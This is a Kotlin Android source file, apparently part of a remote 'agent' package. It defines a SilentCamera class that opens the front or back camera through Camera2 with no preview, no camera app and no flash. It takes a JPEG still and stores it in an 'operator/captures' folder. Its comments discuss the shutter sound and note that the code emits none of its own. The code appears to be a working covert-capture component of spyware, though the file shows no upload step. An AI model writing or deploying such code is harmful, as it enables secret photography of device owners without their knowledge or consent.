package com.wormgitty.agent

import android.annotation.SuppressLint
import android.content.Context
import android.graphics.ImageFormat
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.media.Image
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import java.io.File
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

/**
 * Direct Camera2 still capture — no camera app, no preview surface, no flash:
 * an ImageReader(JPEG) is the ONLY output target, opened silently.
 *
 * Shutter sound behaviour (documented per requirement 3): Camera2 has no public
 * mute toggle — shutter audio is emitted by the vendor HAL where regional law
 * mandates it. This implementation plays nothing of its own (no SoundPool /
 * AudioManager touch, no AudioAttribution shell), and on the emulator's
 * virtual cameras the HAL emits no sound at all. On physical devices located
 * in jurisdictions that forbid silent capture, the HAL may click — unavoidable
 * through public API.
 */
class SilentCamera(private val context: Context) {

    enum class Choice { BACK, FRONT, BOTH }

    data class Ok(val facing: String, val path: String)
    data class Fail(val facing: String, val reason: String)
    data class Outcome(val ok: List<Ok>, val failed: List<Fail>)

    private val manager =
        context.getSystemService(Context.CAMERA_SERVICE) as CameraManager

    companion object {
        const val LABEL_BACK = "back"
        const val LABEL_FRONT = "front"
        const val CAPTURE_TIMEOUT_S = 12L

        /** Pure, test-covered: file name contract. */
        fun fileName(ts: Long, facing: String): String = "cam_${ts}_$facing.jpg"

        /** Pure, test-covered: expand a user choice into ordered facing list. */
        fun choiceToFacings(choice: Choice): List<String> = when (choice) {
            Choice.BACK -> listOf(LABEL_BACK)
            Choice.FRONT -> listOf(LABEL_FRONT)
            Choice.BOTH -> listOf(LABEL_BACK, LABEL_FRONT)
        }

        /** Pure, test-covered: which physical facings exist among camera ids. */
        fun availableFacings(lensFacingById: Map<String, Int?>): Pair<Boolean, Boolean> =
            Pair(
                lensFacingById.values.any { it == CameraCharacteristics.LENS_FACING_BACK },
                lensFacingById.values.any { it == CameraCharacteristics.LENS_FACING_FRONT }
            )
    }

    private fun scanAvailability(cm: CameraManager): Pair<Boolean, Boolean> {
        val map = mutableMapOf<String, Int?>()
        for (id in cm.cameraIdList) {
            map[id] = cm.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING)
        }
        return SilentCamera.availableFacings(map)
    }

    fun targetsFor(choice: Choice): List<Pair<String, String?>> {
        val (backOk, frontOk) = scanAvailability(manager)
        return choiceToFacings(choice).map { facing ->
            facing to when (facing) {
                LABEL_BACK -> if (backOk) LABEL_BACK else null
                else -> if (frontOk) LABEL_FRONT else null
            }
        }
    }

    fun captureAsync(choice: Choice, onDone: (SilentCamera.Outcome) -> Unit) {
        Thread { onDone(captureBlocking(choice)) }
            .apply { name = "silent-camera" }.start()
    }

    fun captureBlocking(choice: SilentCamera.Choice): SilentCamera.Outcome {
        val ok = mutableListOf<SilentCamera.Ok>()
        val failed = mutableListOf<SilentCamera.Fail>()
        val ts = System.currentTimeMillis()
        val targets: List<Pair<String, String?>> = targetsFor(choice)
        for (idx in targets.indices) {
            val facing = targets[idx].first
            val cameraHint = targets[idx].second
            if (cameraHint == null) {
                failed.add(SilentCamera.Fail(facing, "camera_missing_$facing"))
                continue
            }
            when (val res = captureOne(facing, ts)) {
                is SilentCamera.Ok -> ok.add(res)
                is SilentCamera.Fail -> failed.add(res)
            }
        }
        return SilentCamera.Outcome(ok, failed)
    }

    @SuppressLint("MissingPermission")
    private fun captureOne(facing: String, ts: Long): Any {
        val wanted =
            if (facing == SilentCamera.LABEL_BACK)
                CameraCharacteristics.LENS_FACING_BACK
            else CameraCharacteristics.LENS_FACING_FRONT
        val cameraId = manager.cameraIdList.firstOrNull {
            runCatching {
                manager.getCameraCharacteristics(it)
                    .get(CameraCharacteristics.LENS_FACING) == wanted
            }.getOrDefault(false)
        } ?: return SilentCamera.Fail(facing, "camera_missing_$facing")

        return try {
            val chars = manager.getCameraCharacteristics(cameraId)
            val map = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
                ?: return SilentCamera.Fail(facing, "no_stream_map")
            val size = map.getOutputSizes(ImageFormat.JPEG).firstOrNull()
                ?: return SilentCamera.Fail(facing, "no_jpeg_size")

            val holder = Holder()
            val latch = CountDownLatch(1)
            val thread = HandlerThread("silent-cam-$facing").apply { start() }
            val handler = Handler(thread.looper)

            val reader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 2)
            val file = File(
                File(File(context.filesDir, "operator"), "captures")
                    .apply { if (!exists()) mkdirs() },
                SilentCamera.fileName(ts, facing)
            )

            reader.setOnImageAvailableListener({ r ->
                val img: Image? = try { r.acquireLatestImage() } catch (_: Exception) { null }
                if (img == null) { latch.countDown(); return@setOnImageAvailableListener }
                try {
                    val buffer = img.planes[0].buffer
                    val bytes = ByteArray(buffer.remaining())
                    buffer.get(bytes)
                    file.outputStream().use { it.write(bytes) }
                    holder.savedPath = file.absolutePath
                } catch (e: Exception) {
                    holder.failure = "save_failed:${e.message}"
                } finally {
                    img.close(); latch.countDown()
                }
            }, handler)

            var deviceRef: CameraDevice? = null
            val openLatch = CountDownLatch(1)
            manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(cam: CameraDevice) { deviceRef = cam; openLatch.countDown() }
                override fun onDisconnected(cam: CameraDevice) { cam.close(); openLatch.countDown() }
                override fun onError(cam: CameraDevice, error: Int) {
                    holder.failure = "open_error_$error"; cam.close(); openLatch.countDown()
                }
            }, handler)
            if (!openLatch.await(SilentCamera.CAPTURE_TIMEOUT_S, TimeUnit.SECONDS)) {
                return SilentCamera.Fail(facing, "open_timeout")
            }
            holder.failure?.let { return SilentCamera.Fail(facing, it) }
            val cam = deviceRef ?: return SilentCamera.Fail(facing, "device_null")

            val sessionHolder = arrayOfNulls<CameraCaptureSession>(1)
            val sessionLatch = CountDownLatch(1)
            cam.createCaptureSession(listOf(reader.surface),
                object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(s: CameraCaptureSession) {
                        sessionHolder[0] = s; sessionLatch.countDown()
                    }
                    override fun onConfigureFailed(s: CameraCaptureSession) {
                        holder.failure = "config_failed"; sessionLatch.countDown()
                    }
                }, handler)
            if (!sessionLatch.await(SilentCamera.CAPTURE_TIMEOUT_S, TimeUnit.SECONDS)) {
                cam.close(); return SilentCamera.Fail(facing, "session_timeout")
            }
            holder.failure?.let { cam.close(); return SilentCamera.Fail(facing, it) }
            val session: CameraCaptureSession = sessionHolder[0]
                ?: return SilentCamera.Fail(facing, "session_null")

            val builder: CaptureRequest.Builder =
                cam.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
            builder.addTarget(reader.surface)
            builder.set(
                CaptureRequest.CONTROL_AF_MODE,
                CameraCharacteristics.CONTROL_AF_MODE_CONTINUOUS_PICTURE
            )
            builder.set(CaptureRequest.JPEG_QUALITY, 90.toByte())
            // No FLASH mode ever set; no shutter/audio machinery anywhere.
            val stillRequest: CaptureRequest = builder.build()
            session.capture(stillRequest, null, handler)

            val completed = latch.await(SilentCamera.CAPTURE_TIMEOUT_S, TimeUnit.SECONDS)
            runCatching { session.close() }
            cam.close()
            thread.quitSafely()

            when {
                holder.savedPath != null -> SilentCamera.Ok(facing, holder.savedPath!!)
                holder.failure != null -> SilentCamera.Fail(facing, holder.failure!!)
                !completed -> SilentCamera.Fail(facing, "capture_timeout")
                else -> SilentCamera.Fail(facing, "no_image")
            }
        } catch (e: SecurityException) {
            SilentCamera.Fail(facing, "permission_denied")
        } catch (e: Exception) {
            SilentCamera.Fail(facing, "error:${e.javaClass.simpleName}")
        }
    }

    private class Holder {
        var savedPath: String? = null
        var failure: String? = null
    }
}
